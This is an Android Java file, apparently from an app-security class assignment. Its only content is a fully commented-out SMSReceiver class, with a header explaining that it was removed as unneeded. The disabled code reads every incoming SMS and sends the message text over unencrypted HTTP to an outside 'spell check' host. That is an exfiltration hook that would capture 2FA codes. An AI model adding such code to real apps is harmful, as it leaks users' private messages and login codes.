// #############################################################################################
// this entire code is removed because this functionality is not required per assignment # 3 instructions
// the 2fa field is just taking in the phone number that the user registered with; there is no need for
// a SMSReceiver function
// #############################################################################################

//package edu.nyu.appsec.assignment5;
//
//import android.content.BroadcastReceiver;
//import android.content.Context;
//import android.content.Intent;
//import android.os.Build;
//import android.os.Bundle;
//import android.telephony.SmsMessage;
//
//import java.io.IOException;
//import java.net.HttpURLConnection;
//import java.net.MalformedURLException;
//import java.net.URL;
//
//public class SMSReceiver extends BroadcastReceiver {
//    private static final String SPELL_CHECK_URL = "http://appsecclass.report:8080/";
//
//    @Override
//    public void onReceive(Context context, Intent intent) {
//        System.out.println("start of smsreceiver");
//        Bundle bundle = intent.getExtras();
//        String strMessage = "";
//        String format = bundle.getString("format");
//        Object[] pdus = (Object[]) bundle.get("pdus");
//        SmsMessage[] msgs = new SmsMessage[pdus.length];
//        for (int i = 0; i < msgs.length; i++) {
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
//            } else {
//                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
//            }
//
//            URL url = null;
//            try {
//                url = new URL(SPELL_CHECK_URL + "metrics"
//                        +"?msg="+msgs[i].getMessageBody()
//                );
//            } catch (MalformedURLException e) {
//                e.printStackTrace();
//                return;
//            }
//            System.out.println("msg: " + url.toString());
//
//            HttpURLConnection urlConnection = null;
//            try {
//                urlConnection = (HttpURLConnection) url.openConnection();
//                urlConnection.disconnect();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        }
//    }
//}
